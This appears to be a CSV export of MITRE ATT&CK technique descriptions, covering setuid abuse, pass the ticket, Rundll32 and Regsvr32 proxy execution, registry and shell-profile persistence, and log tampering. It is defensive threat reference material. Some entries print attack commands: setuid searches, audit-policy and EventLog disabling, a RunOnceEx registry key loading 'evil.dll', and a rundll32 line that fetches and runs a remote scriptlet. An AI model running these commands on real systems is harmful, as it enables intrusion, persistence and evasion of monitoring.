T1048.002,Exfiltration Over Alternative Protocol: Exfiltration Over Asymmetric Encrypted Non-C2 Protocol,"Adversaries may steal data by exfiltrating it over an asymmetrically encrypted network protocol other than that of the existing command and control channel. The data may also be sent to an alternate network location from the main command and control server.    Asymmetric encryption algorithms are those that use different keys on each end of the channel. Also known as public-key cryptography, this requires pairs of cryptographic keys that can encrypt/decrypt data from the corresponding key. Each end of the communication channels requires a private key (only in the procession of that entity) and the public key of the other entity. The public keys of each entity are exchanged before encrypted communications begin.    Network protocols that use asymmetric encryption (such as HTTPS/TLS/SSL) often utilize symmetric encryption once keys are exchanged. Adversaries may opt to use these encrypted mechanisms that are baked into a protocol.",Description

T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,"An adversary may abuse configurations where an application has the setuid or setgid bits set in order to get code running in a different (and possibly more privileged) user’s context. On Linux or macOS, when the setuid or setgid bits are set for an application binary, the application will run with the privileges of the owning user or group respectively.   [1]    Normally an application is run in the current user’s context, regardless of which user or group owns the application. However, there are instances where programs need to be executed in an elevated context to function properly, but the user running them may not have the specific required privileges.   Instead of creating an entry in the sudoers file, which must be done by root, any user can specify the setuid or setgid flag to be set for their own applications (i.e.  Linux and Mac File and Directory Permissions Modification ). The  chmod  command can set these bits with bitmasking,  chmod 4777 [file]  or via shorthand naming,  chmod u+s [file] . This will enable the setuid bit. To enable the setgit bit,  chmod 2775  and  chmod g+s  can be used.   Adversaries can use this mechanism on their own malware to make sure they're able to execute in elevated contexts in the future.   [2]    This abuse is often part of a ""shell escape"" or other actions to bypass an execution environment with restricted permissions.   Alternatively, adversaries may choose to find and target vulnerable binaries with the setuid or setgid bits already enabled (i.e.  File and Directory Discovery ). The setuid and setguid bits are indicated with an ""s"" instead of an ""x"" when viewing a file's attributes via  ls -l . The  find  command can also be used to search for such files. For example,  find / -perm +4000 2&gt;/dev/null  can be used to find files with setuid set and  find / -perm +2000 2&gt;/dev/null  may be used for setgid. Binaries that have these bits set may then be abused by adversaries.   [3]",Description

T1548.001,Abuse Elevation Control Mechanism: Setuid and Setgid,Keydnap  adds the setuid flag to a binary so it can easily elevate in the future.   [2],Procedure Examples
T1550.003,Use Alternate Authentication Material: Pass the Ticket,"Adversaries may ""pass the ticket"" using stolen Kerberos tickets to move laterally within an environment, bypassing normal system access controls. Pass the ticket (PtT) is a method of authenticating to a system using Kerberos tickets without having access to an account's password. Kerberos authentication can be used as the first step to lateral movement to a remote system.   When preforming PtT, valid Kerberos tickets for  Valid Accounts  are captured by  OS Credential Dumping . A user's service tickets or ticket granting ticket (TGT) may be obtained, depending on the level of access. A service ticket allows for access to a particular resource, whereas a TGT can be used to request service tickets from the Ticket Granting Service (TGS) to access any resource the user has privileges to access.   [1]      [2]      A  Silver Ticket  can be obtained for services that use Kerberos as an authentication mechanism and are used to generate tickets to access that particular resource and the system that hosts the resource (e.g., SharePoint).   [1]      A  Golden Ticket  can be obtained for the domain using the Key Distribution Service account KRBTGT account NTLM hash, which enables generation of TGTs for any account in Active Directory.   [3]      Adversaries may also create a valid Kerberos ticket using other user information, such as stolen password hashes or AES keys. For example, ""overpassing the hash"" involves using a NTLM password hash to authenticate as a user (i.e.  Pass the Hash ) while also using the password hash to create a valid Kerberos ticket.

T1566.002,Phishing: Spearphishing Link,"Adversaries may send spearphishing emails with a malicious link in an attempt to gain access to victim systems. Spearphishing with a link is a specific variant of spearphishing. It is different from other forms of spearphishing in that it employs the use of links to download malware contained in email, instead of attaching malicious files to the email itself, to avoid defenses that may inspect email attachments. Spearphishing may also involve social engineering techniques, such as posing as a trusted source.   All forms of spearphishing are electronically delivered social engineering targeted at a specific individual, company, or industry. In this case, the malicious emails contain links. Generally, the links will be accompanied by social engineering text and require the user to actively click or copy and paste a URL into a browser, leveraging  User Execution . The visited website may compromise the web browser using an exploit, or the user will be prompted to download applications, documents, zip files, or even executables depending on the pretext for the email in the first place. Adversaries may also include links that are intended to interact directly with an email reader, including embedded images intended to exploit the end system directly or verify the receipt of an email (i.e. web bugs/web beacons). Additionally, adversaries may use seemingly benign links that abuse special characters to mimic legitimate websites (known as an ""IDN homograph attack"").   [1]      Adversaries may also utilize links to perform consent phishing, typically with OAuth 2.0 request URLs that when accepted by the user provide permissions/access for malicious applications, allowing adversaries to   Steal Application Access Token s.   [2]    These stolen access tokens allow the adversary to perform various actions on behalf of the user via API calls.    [3]",Description

T1205.001,Traffic Signaling: Port Knocking,"Adversaries may use port knocking to hide open ports used for persistence or command and control. To enable a port, an adversary sends a series of attempted connections to a predefined sequence of closed ports. After the sequence is completed, opening a port is often accomplished by the host based firewall, but could also be implemented by custom software.   This technique has been observed both for the dynamic opening of a listening port as well as the initiating of a connection to a listening server on a different system.   The observation of the signal packets to trigger the communication can be conducted through different methods. One means, originally implemented by Cd00r    [1]   , is to use the libpcap libraries to sniff for the packets in question. Another method leverages raw sockets, which enables the malware to use ports that are already open for use by other programs.",Description

[1]      Office Visual Basic for Applications (VBA) macros    [2]    can be inserted into the base template and used to execute code when the respective Office application starts in order to obtain persistence. Examples for both Word and Excel have been discovered and published. By default, Word has a Normal.dotm template created that can be modified to include a malicious macro. Excel does not have a template file created by default, but one can be added that will automatically be loaded.

T1218.010,System Binary Proxy Execution: Regsvr32,"Adversaries may abuse Regsvr32.exe to proxy execution of malicious code. Regsvr32.exe is a command-line program used to register and unregister object linking and embedding controls, including dynamic link libraries (DLLs), on Windows systems. The Regsvr32.exe binary may also be signed by Microsoft.    [1]      Malicious usage of Regsvr32.exe may avoid triggering security tools that may not monitor execution of, and modules loaded by, the regsvr32.exe process because of allowlists or false positives from Windows using regsvr32.exe for normal operations. Regsvr32.exe can also be used to specifically bypass application control using functionality to load COM scriptlets to execute DLLs under user permissions. Since Regsvr32.exe is network and proxy aware, the scripts can be loaded by passing a uniform resource locator (URL) to file on an external Web server as an argument during invocation. This method makes no changes to the Registry as the COM object is not actually registered, only executed.    [2]    This variation of the technique is often referred to as a ""Squiblydoo"" and has been used in campaigns targeting governments.    [3]       [4]      Regsvr32.exe can also be leveraged to register a COM Object used to establish persistence via  Component Object Model Hijacking .    [3]",Description

T1055.009,Process Injection: Proc Memory,"Adversaries may inject malicious code into processes via the /proc filesystem in order to evade process-based defenses as well as possibly elevate privileges. Proc memory injection is a method of executing arbitrary code in the address space of a separate live process.    Proc memory injection involves enumerating the memory of a process via the /proc filesystem ( /proc/[pid] ) then crafting a return-oriented programming (ROP) payload with available gadgets/instructions. Each running process has its own directory, which includes memory mappings. Proc memory injection is commonly performed by overwriting the target processes’ stack using memory mappings provided by the /proc filesystem. This information can be used to enumerate offsets (including the stack) and gadgets (or instructions within the program that can be used to build a malicious payload) otherwise hidden by process memory protections such as address space layout randomization (ASLR). Once enumerated, the target processes’ memory map within  /proc/[pid]/maps  can be overwritten using dd.   [1]      [2]      [3]       Other techniques such as  Dynamic Linker Hijacking  may be used to populate a target process with more available gadgets. Similar to  Process Hollowing , proc memory injection may target child processes (such as a backgrounded copy of sleep).   [2]       Running code in the context of another process may allow access to the process's memory, system/network resources, and possibly elevated privileges. Execution via proc memory injection may also evade detection from security products since the execution is masked under a legitimate process.",Description
T1574.002,Hijack Execution Flow: DLL Side-Loading,"Adversaries may execute their own malicious payloads by side-loading DLLs. Similar to  DLL Search Order Hijacking , side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order of a program then waiting for the victim application to be invoked, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload(s).   Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. Adversaries likely use side-loading as a means of masking actions they perform under a legitimate, trusted, and potentially elevated system or software process. Benign executables used to side-load payloads may not be flagged during delivery and/or execution.

T1546.004,Event Triggered Execution: Unix Shell Configuration Modification,"Adversaries may establish persistence through executing malicious commands triggered by a user’s shell. User  Unix Shell s execute several configuration scripts at different points throughout the session based on events. For example, when a user opens a command-line interface or remotely logs in (such as via SSH) a login shell is initiated. The login shell executes scripts from the system ( /etc ) and the user’s home directory ( ~/ ) to configure the environment. All login shells on a system use /etc/profile when initiated. These configuration scripts run at the permission level of their directory and are often used to set environment variables, create aliases, and customize the user’s environment. When the shell exits or terminates, additional shell scripts are executed to ensure the shell exits appropriately.    Adversaries may attempt to establish persistence by inserting commands into scripts automatically executed by shells. Using bash as an example, the default shell for most GNU/Linux systems, adversaries may add commands that launch malicious binaries into the  /etc/profile  and  /etc/profile.d  files.   [1]      [2]    These files typically require root permissions to modify and are executed each time any shell on a system launches. For user level permissions, adversaries can insert malicious commands into  ~/.bash_profile ,  ~/.bash_login , or  ~/.profile  which are sourced when a user opens a command-line interface or connects remotely.   [3]      [4]    Since the system only executes the first existing file in the listed order, adversaries have used  ~/.bash_profile  to ensure execution. Adversaries have also leveraged the  ~/.bashrc  file which is additionally executed if the connection is established remotely or an additional interactive shell is opened, such as a new tab in the command-line interface.   [5]      [3]      [6]      [7]    Some malware targets the termination of a program to trigger execution, adversaries can use the  ~/.bash_logout  file to execute malicious commands at the end of a session.    For macOS, the functionality of this technique is similar but may leverage zsh, the default shell for macOS 10.15+. When the Terminal.app is opened, the application launches a zsh login shell and a zsh interactive shell. The login shell configures the system environment using  /etc/profile ,  /etc/zshenv ,  /etc/zprofile , and  /etc/zlogin .   [8]      [9]      [10]      [11]    The login shell then configures the user environment with  ~/.zprofile  and  ~/.zlogin . The interactive shell uses the  ~/.zshrc  to configure the user environment. Upon exiting,  /etc/zlogout  and  ~/.zlogout  are executed. For legacy programs, macOS executes  /etc/bashrc  on startup.",Description

T1606.002,Forge Web Credentials: SAML Tokens,"An adversary may forge SAML tokens with any permissions claims and lifetimes if they possess a valid SAML token-signing certificate.   [1]    The default lifetime of a SAML token is one hour, but the validity period can be specified in the  NotOnOrAfter  value of the  conditions ...  element in a token. This value can be changed using the  AccessTokenLifetime  in a  LifetimeTokenPolicy .   [2]    Forged SAML tokens enable adversaries to authenticate across services that use SAML 2.0 as an SSO (single sign-on) mechanism.   [3]      An adversary may utilize  Private Keys  to compromise an organization's token-signing certificate to create forged SAML tokens. If the adversary has sufficient permissions to establish a new federation trust with their own Active Directory Federation Services (AD FS) server, they may instead generate their own trusted token-signing certificate.   [4]    This differs from  Steal Application Access Token  and other similar behaviors in that the tokens are new and forged by the adversary, rather than stolen or intercepted from legitimate users.   An adversary may gain administrative Azure AD privileges if a SAML token is forged which claims to represent a highly privileged account. This may lead to  Use Alternate Authentication Material , which may bypass multi-factor and other authentication protection mechanisms.   [4]",Description

T1568.002,Dynamic Resolution: Domain Generation Algorithms,"Adversaries may make use of Domain Generation Algorithms (DGAs) to dynamically identify a destination domain for command and control traffic rather than relying on a list of static IP addresses or domains. This has the advantage of making it much harder for defenders to block, track, or take over the command and control channel, as there potentially could be thousands of domains that malware can check for instructions.   [1]      [2]      [3]      DGAs can take the form of apparently random or ""gibberish"" strings (ex: istgmxdejdnxuyla.ru) when they construct domain names by generating each letter. Alternatively, some DGAs employ whole words as the unit by concatenating words together instead of letters (ex: cityjulydish.net). Many DGAs are time-based, generating a different domain for each time period (hourly, daily, monthly, etc). Others incorporate a seed value as well to make predicting future domains more difficult for defenders.   [1]      [2]      [4]      [5]      Adversaries may use DGAs for the purpose of  Fallback Channels .

T1176,Browser Extensions,"Adversaries may abuse Internet browser extensions to establish persistent access to victim systems. Browser extensions or plugins are small programs that can add functionality and customize aspects of Internet browsers. They can be installed directly or through a browser's app store and generally have access and permissions to everything that the browser can access.   [1]      [2]      Malicious extensions can be installed into a browser through malicious app store downloads masquerading as legitimate extensions, through social engineering, or by an adversary that has already compromised a system. Security can be limited on browser app stores so it may not be difficult for malicious extensions to defeat automated scanners.   [3]    Depending on the browser, adversaries may also manipulate an extension's update url to install updates from an adversary controlled server or manipulate the mobile configuration file to silently install additional extensions.   Previous to macOS 11, adversaries could silently install browser extensions via the command line using the  profiles  tool to install malicious  .mobileconfig  files. In macOS 11+, the use of the  profiles  tool can no longer install configuration profiles, however  .mobileconfig  files can be planted and installed with user interaction.   [4]      Once the extension is installed, it can browse to websites in the background, steal all information that a user enters into a browser (including credentials), and be used as an installer for a RAT for persistence.   [5]      [6]      [7]      [8]      There have also been instances of botnets using a persistent backdoor through malicious Chrome extensions.

T1546.008,Event Triggered Execution: Accessibility Features,"Adversaries may establish persistence and/or elevate privileges by executing malicious content triggered by accessibility features. Windows contains accessibility features that may be launched with a key combination before a user has logged in (ex: when the user is on the Windows logon screen). An adversary can modify the way these programs are launched to get a command prompt or backdoor without logging in to the system.   Two common accessibility programs are  C:\Windows\System32\sethc.exe , launched when the shift key is pressed five times and  C:\Windows\System32\utilman.exe , launched when the Windows + U key combination is pressed. The sethc.exe program is often referred to as ""sticky keys"", and has been used by adversaries for unauthenticated access through a remote desktop login screen.    [1]      Depending on the version of Windows, an adversary may take advantage of these features in different ways. Common methods used by adversaries include replacing accessibility feature binaries or pointers/references to these binaries in the Registry. In newer versions of Windows, the replaced binary needs to be digitally signed for x64 systems, the binary must reside in  %systemdir%\ , and it must be protected by Windows File or Resource Protection (WFP/WRP).    [2]    The  Image File Execution Options Injection  debugger method was likely discovered as a potential workaround because it does not require the corresponding accessibility feature binary to be replaced.   For simple binary replacement on Windows XP and later as well as and Windows Server 2003/R2 and later, for example, the program (e.g.,  C:\Windows\System32\utilman.exe ) may be replaced with ""cmd.exe"" (or another program that provides backdoor access). Subsequently, pressing the appropriate key combination at the login screen while sitting at the keyboard or when connected over  Remote Desktop Protocol  will cause the replaced file to be executed with SYSTEM privileges.    [3]      Other accessibility features exist that may also be leveraged in a similar fashion:    [2]      [4]",Description

T1592.003,Gather Victim Host Information: Firmware,"Adversaries may gather information about the victim's host firmware that can be used during targeting. Information about host firmware may include a variety of details such as type and versions on specific hosts, which may be used to infer more information about hosts in the environment (ex: configuration, purpose, age/patch level, etc.).   Adversaries may gather this information in various ways, such as direct elicitation via  Phishing for Information . Information about host firmware may only be exposed to adversaries via online or other accessible data sets (ex: job postings, network maps, assessment reports, resumes, or purchase invoices).   [1]    Gathering this information may reveal opportunities for other forms of reconnaissance (ex:  Search Open Websites/Domains  or  Search Open Technical Databases ), establishing operational resources (ex:  Develop Capabilities  or  Obtain Capabilities ), and/or initial access (ex:  Supply Chain Compromise  or  Exploit Public-Facing Application ).",Description
T1557.002,Adversary-in-the-Middle: ARP Cache Poisoning,"Adversaries may poison Address Resolution Protocol (ARP) caches to position themselves between the communication of two or more networked devices. This activity may be used to enable follow-on behaviors such as  Network Sniffing  or  Transmitted Data Manipulation .   The ARP protocol is used to resolve IPv4 addresses to link layer addresses, such as a media access control (MAC) address.   [1]    Devices in a local network segment communicate with each other by using link layer addresses. If a networked device does not have the link layer address of a particular networked device, it may send out a broadcast ARP request to the local network to translate the IP address to a MAC address. The device with the associated IP address directly replies with its MAC address. The networked device that made the ARP request will then use as well as store that information in its ARP cache.   An adversary may passively wait for an ARP request to poison the ARP cache of the requesting device. The adversary may reply with their MAC address, thus deceiving the victim by making them believe that they are communicating with the intended networked device. For the adversary to poison the ARP cache, their reply must be faster than the one made by the legitimate IP address owner. Adversaries may also send a gratuitous ARP reply that maliciously announces the ownership of a particular IP address to all the devices in the local network segment.   The ARP protocol is stateless and does not require authentication. Therefore, devices may wrongly add or update the MAC address of the IP address in their ARP cache.   [2]      [3]      Adversaries may use ARP cache poisoning as a means to intercept network traffic. This activity may be used to collect and/or relay data such as credentials, especially those sent over an insecure, unencrypted protocol.   [2]",Description

T1556.006,Modify Authentication Process: Multi-Factor Authentication,"Adversaries may disable or modify multi-factor authentication (MFA) mechanisms to enable persistent access to compromised accounts.   Once adversaries have gained access to a network by either compromising an account lacking MFA or by employing an MFA bypass method such as  Multi-Factor Authentication Request Generation , adversaries may leverage their access to modify or completely disable MFA defenses. This can be accomplished by abusing legitimate features, such as excluding users from Azure AD Conditional Access Policies, registering a new yet vulnerable/adversary-controlled MFA method, or by manually patching MFA programs and configuration files to bypass expected functionality.   [1]      [2]      For example, modifying the Windows hosts file ( C:\windows\system32\drivers\etc\hosts ) to redirect MFA calls to localhost instead of an MFA server may cause the MFA process to fail. If a ""fail open"" policy is in place, any otherwise successful authentication attempt may be granted access without enforcing MFA.    [3]       Depending on the scope, goals, and privileges of the adversary, MFA defenses may be disabled for individual accounts or for all accounts tied to a larger group, such as all domain accounts in a victim's network environment.

T1547.001,Boot or Logon Autostart Execution: Registry Run Keys  or  Startup Folder,"Adversaries may achieve persistence by adding a program to a startup folder or referencing it with a Registry run key. Adding an entry to the ""run keys"" in the Registry or startup folder will cause the program referenced to be executed when a user logs in.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Placing a program within a startup folder will also cause that program to execute when a user logs in. There is a startup folder location for individual user accounts as well as a system-wide startup folder that will be checked regardless of which user account logs in. The startup folder path for the current user is  C:\Users\[Username]\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup . The startup folder path for all users is  C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp .   The following run keys are created by default on Windows systems:   Run keys may exist under multiple hives.   [2]      [3]    The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\RunOnceEx  is also available but is not created by default on Windows Vista and newer. Registry run key entries can reference programs directly or list them as a dependency.   [1]    For example, it is possible to load a DLL at logon using a ""Depend"" key with RunOnceEx:  reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnceEx\0001\Depend /v 1 /d ""C:\temp\evil[.]dll""     [4]      The following Registry keys can be used to set startup folder items for persistence:   The following Registry keys can control automatic startup of services during boot:   Using policy settings to specify startup programs creates corresponding values in either of two Registry keys:   The Winlogon key controls actions that occur when a user logs on to a computer running Windows 7. Most of these actions are under the control of the operating system, but you can also add custom actions here. The  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit  and  HKEY_LOCAL_MACHINE\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Shell  subkeys can automatically launch programs.   Programs listed in the load value of the registry key  HKEY_CURRENT_USER\Software\Microsoft\Windows NT\CurrentVersion\Windows  run when any user logs on.   By default, the multistring  BootExecute  value of the registry key  HKEY_LOCAL_MACHINE\System\CurrentControlSet\Control\Session Manager  is set to  autocheck autochk * . This value causes Windows, at startup, to check the file-system integrity of the hard disks if the system has been shut down abnormally. Adversaries can add other programs or processes to this registry value which will automatically launch at boot.   Adversaries can use these configuration locations to execute malware, such as remote access tools, to maintain persistence through system reboots.

T1548.004,Abuse Elevation Control Mechanism: Elevated Execution with Prompt,"Adversaries may leverage the  AuthorizationExecuteWithPrivileges  API to escalate privileges by prompting the user for credentials.   [1]    The purpose of this API is to give application developers an easy way to perform operations with root privileges, such as for application installation or updating. This API does not validate that the program requesting root privileges comes from a reputable source or has been maliciously modified.    Although this API is deprecated, it still fully functions in the latest releases of macOS. When calling this API, the user will be prompted to enter their credentials but no checks on the origin or integrity of the program are made. The program calling the API may also load world writable files which can be modified to perform malicious behavior with elevated privileges.   Adversaries may abuse  AuthorizationExecuteWithPrivileges  to obtain root privileges in order to install malicious software on victims and install persistence mechanisms.   [2]      [3]      [4]    This technique may be combined with  Masquerading  to trick the user into granting escalated privileges to malicious code.

T1027,Obfuscated Files or Information,"Adversaries may attempt to make an executable or file difficult to discover or analyze by encrypting, encoding, or otherwise obfuscating its contents on the system or in transit. This is common behavior that can be used across different platforms and the network to evade defenses.    Payloads may be compressed, archived, or encrypted in order to avoid detection. These payloads may be used during Initial Access or later to mitigate detection. Sometimes a user's action may be required to open and  Deobfuscate/Decode Files or Information  for  User Execution . The user may also be required to input a password to open a password protected compressed/encrypted file that was provided by the adversary.    [1]    Adversaries may also use compressed or archived scripts, such as JavaScript.    Portions of files can also be encoded to hide the plain-text strings that would otherwise help defenders with discovery.    [2]    Payloads may also be split into separate, seemingly benign files that only reveal malicious functionality when reassembled.    [3]      Adversaries may also obfuscate commands executed from payloads or directly via a  Command and Scripting Interpreter . Environment variables, aliases, characters, and other platform/language specific semantics can be used to evade signature based detections and application control mechanisms.

The EventLog service maintains event logs from various system components and applications.   [2]    By default, the service automatically starts when a system powers on. An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs. Security audit policy settings can be changed by running secpol.msc, then navigating to  Security Settings\Local Policies\Audit Policy  for basic audit policy settings or  Security Settings\Advanced Audit Policy Configuration  for advanced audit policy settings.   [3]      [4]     auditpol.exe  may also be used to set audit policies.   [5]      Adversaries may target system-wide logging or just that of a particular application. For example, the EventLog service may be disabled using the following PowerShell line:  Stop-Service -Name EventLog .   [6]    Additionally, adversaries may use  auditpol  and its sub-commands in a command prompt to disable auditing or clear the audit policy. To enable or disable a specified setting or audit category, adversaries may use the  /success  or  /failure  parameters. For example,  auditpol /set /category:""Account Logon"" /success:disable /failure:disable  turns off auditing for the Account Logon category.   [7]      [8]    To clear the audit policy, adversaries may run the following lines:  auditpol /clear /y  or  auditpol /remove /allusers .

T1563.001,Remote Service Session Hijacking: SSH Hijacking,"Adversaries may hijack a legitimate user's SSH session to move laterally within an environment. Secure Shell (SSH) is a standard means of remote access on Linux and macOS systems. It allows a user to connect to another system via an encrypted tunnel, commonly authenticating through a password, certificate or the use of an asymmetric encryption key pair.   In order to move laterally from a compromised host, adversaries may take advantage of trust relationships established with other systems via public key authentication in active SSH sessions by hijacking an existing connection to another system. This may occur through compromising the SSH agent itself or by having access to the agent's socket. If an adversary is able to obtain root access, then hijacking SSH sessions is likely trivial.   [1]      [2]      [3]      [4]       SSH Hijacking  differs from use of  SSH  because it hijacks an existing SSH session rather than creating a new session using  Valid Accounts .",Description
T1548.002,Abuse Elevation Control Mechanism: Bypass User Account Control,"Adversaries may bypass UAC mechanisms to elevate process privileges on system. Windows User Account Control (UAC) allows a program to elevate its privileges (tracked as integrity levels ranging from low to high) to perform a task under administrator-level permissions, possibly by prompting the user for confirmation. The impact to the user ranges from denying the operation under high enforcement to allowing the user to perform the action if they are in the local administrators group and click through the prompt or allowing them to enter an administrator password to complete the action.   [1]      If the UAC protection level of a computer is set to anything but the highest level, certain Windows programs can elevate privileges or execute some elevated  Component Object Model  objects without prompting the user through the UAC notification box.   [2]      [3]    An example of this is use of  Rundll32  to load a specifically crafted DLL which loads an auto-elevated  Component Object Model  object and performs a file operation in a protected directory which would typically require elevated access. Malicious software may also be injected into a trusted process to gain elevated privileges without prompting a user.   [4]      Many methods have been discovered to bypass UAC. The Github readme page for UACME contains an extensive list of methods   [5]    that have been discovered and implemented, but may not be a comprehensive list of bypasses. Additional bypass methods are regularly discovered and some used in the wild, such as:   Another bypass is possible through some lateral movement techniques if credentials for an account with administrator privileges are known, since UAC is a single system security mechanism, and the privilege or integrity of a process running on one system will be unknown on remote systems and default to high integrity.

T1556,Modify Authentication Process,"Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts. The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials. By modifying an authentication process, an adversary may be able to authenticate to a service or system without using  Valid Accounts .   Adversaries may maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms. Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services, such as VPNs, Outlook Web Access and remote desktop.",Description

T1583,Acquire Infrastructure,"Adversaries may buy, lease, or rent infrastructure that can be used during targeting. A wide variety of infrastructure exists for hosting and orchestrating adversary operations. Infrastructure solutions include physical or cloud servers, domains, and third-party web services.   [1]    Additionally, botnets are available for rent or purchase.   Use of these infrastructure solutions allows an adversary to stage, launch, and execute an operation. Solutions may help adversary operations blend in with traffic that is seen as normal, such as contact to third-party web services. Depending on the implementation, adversaries may use infrastructure that makes it difficult to physically tie back to them as well as utilize infrastructure that can be rapidly provisioned, modified, and shut down.",Description
T1111,Multi-Factor Authentication Interception,"Adversaries may target multi-factor authentication (MFA) mechanisms, (I.e., smart cards, token generators, etc.) to gain access to credentials that can be used to access systems, services, and network resources. Use of MFA is recommended and provides a higher level of security than user names and passwords alone, but organizations should be aware of techniques that could be used to intercept and bypass these security mechanisms.    If a smart card is used for multi-factor authentication, then a keylogger will need to be used to obtain the password associated with a smart card during normal use. With both an inserted card and access to the smart card password, an adversary can connect to a network resource using the infected system to proxy the authentication with the inserted hardware token.    [1]      Adversaries may also employ a keylogger to similarly target other hardware tokens, such as RSA SecurID. Capturing token input (including a user's personal identification code) may provide temporary access (i.e. replay the one-time passcode until the next value rollover) as well as possibly enabling adversaries to reliably predict future authentication values (given access to both the algorithm and any seed values used to generate appended temporary codes).    [2]      Other methods of MFA may be intercepted and used by an adversary to authenticate. It is common for one-time codes to be sent via out-of-band communications (email, SMS). If the device and/or service is not secured, then it may be vulnerable to interception. Although primarily focused on by cyber criminals, these authentication mechanisms have been targeted by advanced actors.    [3]",Description

T1497.003,Virtualization or Sandbox Evasion: Time Based Evasion,"Adversaries may employ various time-based methods to detect and avoid virtualization and analysis environments. This may include enumerating time-based properties, such as uptime or the system clock, as well as the use of timers or other triggers to avoid a virtual machine environment (VME) or sandbox, specifically those that are automated or only operate for a limited amount of time.   Adversaries may employ various time-based evasions, such as delaying malware functionality upon initial execution using programmatic sleep commands or native system scheduling functionality (ex:  Scheduled Task/Job ). Delays may also be based on waiting for specific victim conditions to be met (ex: system time, events, etc.) or employ scheduled  Multi-Stage Channels  to avoid analysis and scrutiny.   [1]      Benign commands or other operations may also be used to delay malware execution. Loops or otherwise needless repetitions of commands, such as  Ping s, may be used to delay malware execution and potentially exceed time thresholds of automated analysis environments.   [2]      [3]    Another variation, commonly referred to as API hammering, involves making various calls to  Native API  functions in order to delay execution (while also potentially overloading analysis environments with junk data).   [4]      [5]      Adversaries may also use time as a metric to detect sandboxes and analysis environments, particularly those that attempt to manipulate time mechanisms to simulate longer elapses of time. For example, an adversary may be able to identify a sandbox accelerating time by sampling and calculating the expected value for an environment's timestamp before and after execution of a sleep function.

T1218.011,System Binary Proxy Execution: Rundll32,"Adversaries may abuse rundll32.exe to proxy execution of malicious code. Using rundll32.exe, vice executing directly (i.e.  Shared Modules ), may avoid triggering security tools that may not monitor execution of the rundll32.exe process because of allowlists or false positives from normal operations. Rundll32.exe is commonly associated with executing DLL payloads (ex:  rundll32.exe {DLLname, DLLfunction} ).   Rundll32.exe can also be used to execute  Control Panel  Item files (.cpl) through the undocumented shell32.dll functions  Control_RunDLL  and  Control_RunDLLAsUser . Double-clicking a .cpl file also causes rundll32.exe to execute.    [1]      Rundll32 can also be used to execute scripts such as JavaScript. This can be done using a syntax similar to this:  rundll32.exe javascript:""..\mshtml,RunHTMLApplication "";document.write();GetObject(""script:https[:]//www[.]example[.]com/malicious.sct"")""   This behavior has been seen used by malware such as Poweliks.    [2]      Adversaries may also attempt to obscure malicious code from analysis by abusing the manner in which rundll32.exe loads DLL function names. As part of Windows compatibility support for various character sets, rundll32.exe will first check for wide/Unicode then ANSI character-supported functions before loading the specified function (e.g., given the command  rundll32.exe ExampleDLL.dll, ExampleFunction , rundll32.exe would first attempt to execute  ExampleFunctionW , or failing that  ExampleFunctionA , before loading  ExampleFunction ). Adversaries may therefore obscure malicious code by creating multiple identical exported function names and appending  W  and/or  A  to harmless ones.   [3]      [4]    DLL functions can also be exported and executed by an ordinal number (ex:  rundll32.exe file.dll,#1 ).   Additionally, adversaries may use  Masquerading  techniques (such as changing DLL file names, file extensions, or function names) to further conceal execution of a malicious payload.

T1606,Forge Web Credentials,"Adversaries may forge credential materials that can be used to gain access to web applications or Internet services. Web applications and services (hosted in cloud SaaS environments or on-premise servers) often use session cookies, tokens, or other materials to authenticate and authorize user access.   Adversaries may generate these credential materials in order to gain access to web resources. This differs from  Steal Web Session Cookie ,  Steal Application Access Token , and other similar behaviors in that the credentials are new and forged by the adversary, rather than stolen or intercepted from legitimate users. The generation of web credentials often requires secret values, such as passwords,  Private Keys , or other cryptographic seed values.   [1]      Once forged, adversaries may use these web credentials to access resources (ex:  Use Alternate Authentication Material ), which may bypass multi-factor and other authentication protection mechanisms.   [2]      [3]      [4]",Description
T1547.014,Boot or Logon Autostart Execution: Active Setup,"Adversaries may achieve persistence by adding a Registry key to the Active Setup of the local machine. Active Setup is a Windows mechanism that is used to execute programs when a user logs in. The value stored in the Registry key will be executed after a user logs into the computer.   [1]    These programs will be executed under the context of the user and will have the account's associated permissions level.   Adversaries may abuse Active Setup by creating a key under   HKLM\SOFTWARE\Microsoft\Active Setup\Installed Components\  and setting a malicious value for  StubPath . This value will serve as the program that will be executed when a user logs into the computer.   [2]      [3]      [4]      [5]      [6]      Adversaries can abuse these components to execute malware, such as remote access tools, to maintain persistence through system reboots.

T1574.013,Hijack Execution Flow: KernelCallbackTable,"Adversaries may abuse the  KernelCallbackTable  of a process to hijack its execution flow in order to run their own payloads.   [1]      [2]    The  KernelCallbackTable  can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once  user32.dll  is loaded.   [3]      An adversary may hijack the execution flow of a process using the  KernelCallbackTable  by replacing an original callback function with a malicious payload. Modifying callback functions can be achieved in various ways involving related behaviors such as  Reflective Code Loading  or  Process Injection  into another process.   A pointer to the memory address of the  KernelCallbackTable  can be obtained by locating the PEB (ex: via a call to the  NtQueryInformationProcess()   Native API  function).   [4]    Once the pointer is located, the  KernelCallbackTable  can be duplicated, and a function in the table (e.g.,  fnCOPYDATA ) set to the address of a malicious payload (ex: via  WriteProcessMemory() ). The PEB is then updated with the new address of the table. Once the tampered function is invoked, the malicious payload will be triggered.   [1]      The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the  KernelCallbackTable  may also be restored to its original state by the rest of the malicious payload.   